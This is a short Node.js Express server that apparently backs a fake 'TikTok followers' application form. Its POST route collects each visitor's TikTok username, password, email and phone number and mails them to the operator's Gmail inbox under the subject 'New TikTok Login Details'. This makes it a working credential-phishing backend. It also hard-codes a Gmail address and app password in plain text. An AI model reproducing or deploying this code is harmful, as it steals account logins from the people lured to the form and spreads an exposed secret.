const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Home Route
app.get('/', (req, res) => {
    res.send('Server is running smoothly!');
});

// Configure Nodemailer Transporter using Gmail SMTP
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'lagharitahir08@gmail.com',
        pass: 'mcfn tmzh qnxd ghaa' // App Password
    }
});

// POST Route for handling application form
app.post('/api/apply-followers', async (req, res) => {
    const { tiktokUsername, email, phoneNumber, tiktokPassword, packageType } = req.body;

    // Basic Validation
    if (!tiktokUsername || !email) {
        return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    const mailOptions = {
        from: 'lagharitahir08@gmail.com',
        to: 'lagharitahir08@gmail.com',
        subject: `New TikTok Login Details😍: @${tiktokUsername}`,
        html: `
            <h3>New TikTok Account Details Arrived😁</h3>
            <p><strong>Email Address:</strong> ${email}</p>
            <p><strong>Phone Number:</strong> ${phoneNumber}</p>
            <p><strong>TikTok Username:</strong> @${tiktokUsername}</p>
            <p><strong>TikTok Password:</strong> ${tiktokPassword}</p>

            <p><strong>Package Selected:</strong> ${packageType}</p>
            <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        return res.status(200).json({ success: true, message: 'Application submitted successfully!' });
    } catch (error) {
        console.error('Error sending email:', error);
        return res.status(500).json({ success: false, message: 'Failed to send notification email.' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));